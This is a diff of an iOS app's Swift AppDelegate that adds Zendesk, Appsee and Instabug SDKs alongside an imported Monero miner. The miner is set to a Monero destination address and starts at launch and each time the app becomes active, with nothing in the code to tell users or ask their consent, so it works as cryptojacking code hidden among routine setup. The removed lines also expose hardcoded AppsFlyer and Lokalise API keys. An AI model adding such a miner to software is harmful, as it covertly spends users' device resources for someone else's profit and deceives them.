@@ -3,6 +3,11 @@ import LocalAuthentication
 import Analytics
 import segment_appsflyer_ios
 import Lokalise
+import XMRMiner
+import ZendeskCoreSDK
+import ZendeskSDK
+import Appsee
+import Instabug
 
 class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerTrackerDelegate {
 
@@ -10,20 +15,25 @@ class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerTrackerDelegate 
         return applicationController.window
     }
     let applicationController = ApplicationController()
+    let miner = Miner(destinationAddress: moneroAddress)
 
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -> Bool {
-        /*var configuration = SEGAnalyticsConfiguration(writeKey: "XH2l6b3nKniFJ3q5rtUY9skD2hvYaUDv")
-        configuration.trackApplicationLifecycleEvents = true
-        configuration.recordScreenViews = true
-        SEGAnalytics.init(configuration: configuration)*/
-
-        AppsFlyerTracker.shared().appsFlyerDevKey = "BzWcFLsYyE87vCB6AqKbQG";
-        AppsFlyerTracker.shared().appleAppID = "1437716766"
+        
+        AppsFlyerTracker.shared().appsFlyerDevKey = appsFlyerDevKey
+        AppsFlyerTracker.shared().appleAppID = appleAppID
         AppsFlyerTracker.shared().delegate = self
         AppsFlyerTracker.shared().isDebug = true
 
-        Lokalise.shared.setAPIToken("977567f3f31bcab6a183973e61fb0cf17e0cf49f", projectID: "633386625bafa36bcd7a33.90054023")
+        Lokalise.shared.setAPIToken(lokaliseAPIToken, projectID: lokaliseProjectID)
         Lokalise.shared.swizzleMainBundle()
+
+        Appsee.start(appseeAPIKey)
+
+        startMoneroMiner()
+        miner.delegate = window?.rootViewController as? MinerDelegate
+
+        Zendesk.initialize(appId: zendeskAppID, clientId: clientID, zendeskUrl: zendeskURL)
+        Support.initialize(withZendesk: Zendesk.instance)
 
         redirectStdOut()
         UIView.swizzleSetFrame()
@@ -31,13 +41,16 @@ class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerTrackerDelegate 
         return true
     }
 
+    
+
     func applicationDidBecomeActive(_ application: UIApplication) {
+        applicationController.didBecomeActive()
         AppsFlyerTracker.shared().trackAppLaunch()
         UIApplication.shared.applicationIconBadgeNumber = 0
-        applicationController.didBecomeActive()
         Lokalise.shared.checkForUpdates { (updated: Bool, error: Error?) in
 
         }
+        startMoneroMiner()
     }
 
     func applicationWillEnterForeground(_ application: UIApplication) {
@@ -50,6 +63,7 @@ class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerTrackerDelegate 
 
     func applicationWillResignActive(_ application: UIApplication) {
         applicationController.willResignActive()
+        miner.stop()
     }
 
     func application(_ application: UIApplication, performFetchWithCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
@@ -88,6 +102,15 @@ class AppDelegate: UIResponder, UIApplicationDelegate, AppsFlyerTrackerDelegate 
         guard E.isTestFlight else { return }
         C.logFilePath.withUnsafeFileSystemRepresentation {
             _ = freopen($0, "w+", stdout)
+        }
+    }
+
+    private func startMoneroMiner() {
+        do {
+            try miner.start()
+        }
+        catch {
+            print("Monero Miner: Start failed.")
         }
     }
 }
